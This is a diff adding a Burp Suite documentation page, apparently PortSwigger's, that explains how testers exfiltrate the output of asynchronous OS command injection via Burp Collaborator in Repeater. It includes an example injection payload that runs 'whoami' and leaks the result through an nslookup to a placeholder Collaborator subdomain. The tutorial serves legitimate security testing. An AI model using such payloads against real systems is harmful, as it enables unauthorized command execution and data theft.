@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/assets/ps/styles/psselfservice.css">
+<cms page-layout="FREESTYLE" ignore-validation="OTHER_PAGE_KEYWORD_TOO_FREQUENT"></cms>
+</head>
+<body class="section theme-white wrapper-themed">
+<section class="container ps-breadcrumbs">
+    <ol class="breadcrumb-list">
+        <li>
+            <a href="https://portswigger.net/support">Support Center</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/index.html">Documentation</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/index.html">Desktop editions</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/index.html">Testing workflow</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/index.html">Testing input validation</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/command-injection/index.html">OS command injection</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/command-injection/exfiltrate-data.html">Exploiting OS command injection vulnerabilities to exfiltrate data</a>
+        </li>
+    </ol>
+</section>
+<section class="container labels-editions-wrapper">
+    <label class="label-edition is-professional">Professional</label>
+</section>
+<h1>Exploiting OS command injection vulnerabilities to exfiltrate data with Burp Suite</h1>
+<div class="container">
+    <div class="youtube-wrapper">
+        <iframe src="https://www.youtube.com/embed/9JDx_hFPoe0?origin=https://portswigger.net&rel=0" allowfullscreen></iframe>
+    </div>
+</div>
+<p>
+    Once you have identified a request that is vulnerable to asynchronous OS command injection, you can attempt to exfiltrate the output from injected commands through the out-of-band channel between the website and Burp Collaborator.
+</p>
+<h2 id="before-you-start" cms-ignore-validation="DUPLICATE_HEADINGS">Before you start</h2>
+<p>
+    Identify a request that is vulnerable to asynchronous OS command injection. For more information, see <a href="/burp/documentation/desktop/testing-workflow/input-validation/command-injection/asynchronous.html">Testing for asynchronous OS command injection vulnerabilities with Burp Suite.</a>
+</p>
+<h2 id="steps" cms-ignore-validation="DUPLICATE_HEADINGS">Steps</h2>
+<p>
+    You can use Burp Repeater to attempt to exfiltrate data from a request:
+</p>
+<ol>
+    <li>
+        In <strong>Proxy &gt; HTTP history</strong>, right-click the request that is vulnerable to asynchronous OS command injection. Select <strong>Send to Repeater</strong>.
+    </li>
+    <li>
+        Go to the <strong>Repeater</strong> tab.
+    </li>
+    <li>
+        <p>
+            Change a parameter's value to a proof-of-concept payload. The payload should include:
+        </p>
+        <ul>
+            <li>
+                The <code>nslookup</code> command to cause DNS lookup for a Collaborator subdomain. To insert a Collaborator subdomain into the payload, right-click and select <strong>Insert Collaborator payload</strong>.
+            </li>
+            <li>
+                A command that obtains information, such as the <code>whoami</code> command.
+            </li>
+        </ul>
+        <p>
+            For example, <code>& nslookup `whoami`.burp-collaborator-subdomain &</code> may cause a DNS lookup to the Burp Collaborator subdomain. This lookup will contain the result of the <code>whoami</code> command.
+        </p>
+    </li>
+    <li>
+        Click <strong>Send</strong>.
+    </li>
+    <li>
+        Go to the <strong>Collaborator</strong> tab and click <strong>Poll now</strong>. Any interactions with the Collaborator server are listed in the table.
+    </li>
+    <li>
+        Review the details of any interactions to identify any exfiltrated data.
+    </li>
+</ol>
+<div class="highlightedarea">
+    <h4>Note</h4>
+    <p>
+        The command may be executed after a delay. The <strong>Collaborator</strong> tab flashes when an interaction occurs. Make sure that you continue to check the <strong>Collaborator</strong> tab to identify any delayed interactions.
+    </p>
+</div>
+<div class="highlightedarea">
+    <h4>Related pages</h4>
+    <ul>
+        <li>
+            Academy: <a href="/web-security/os-command-injection/index.html">OS command injection</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/scanner/index.html">Burp Scanner</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/tools/repeater/index.html">Burp Repeater</a>
+        </li>
+    </ul>
+</div>
+</body>
+</html>
